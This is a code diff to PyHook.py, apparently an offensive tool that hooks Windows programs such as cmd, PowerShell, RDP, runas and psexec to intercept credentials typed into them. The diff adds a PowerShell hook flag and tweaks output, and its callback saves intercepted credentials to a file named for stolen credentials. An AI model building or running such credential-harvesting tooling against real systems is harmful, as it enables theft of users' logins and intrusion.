@@ -19,9 +19,10 @@ example_text = '''example:
 python PyHook.py
 
 -c, --cmd          enable cmd hook.
+-po, --powershell  enable powershell hook
 -r, --rdp          enable mstsc hook.
 -x, --xterm        enable mobaxterm hook.
--ru, --runas        enable runas hook.
+-ru, --runas       enable runas hook.
 -e, --explorer     enable explorer hook.
 -p, --psexec       enable psexec hook.
 
@@ -31,6 +32,7 @@ No flags           enable all hooks'''
 def parse_args():
     parser = ArgumentParser(epilog=example_text, formatter_class=RawTextHelpFormatter)
     parser.add_argument('-c', '--cmd', action='store_true')
+    parser.add_argument('-po', '--powershell', action='store_true')
     parser.add_argument('-r', '--rdp', action='store_true')
     parser.add_argument('-x', '--mobaxterm', action='store_true')
     parser.add_argument('-ru', '--runas', action='store_true')
@@ -97,14 +99,14 @@ def wait_for_process(process_name, hook_function):
 
 
 def on_credential_submit(message, data):
-    print(f"[+] Got message from hooked process:")
+    print(f"\n[+] Got message from hooked process:\n")
     print(message)
     if message['type'] == "send":
         credential_dump = message["payload"]
         hooked_program = re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump) \
                                     .groups("hooked_program")[0]
 
-        print(f"[+] Parsed credentials submitted to {hooked_program} prompt:")
+        print(f"\n[+] Parsed credentials submitted to {hooked_program} prompt:")
         print(credential_dump)
         with open("credentials.txt", "a") as stolen_credentials_file:
             stolen_credentials_file.write(credential_dump + '\n')
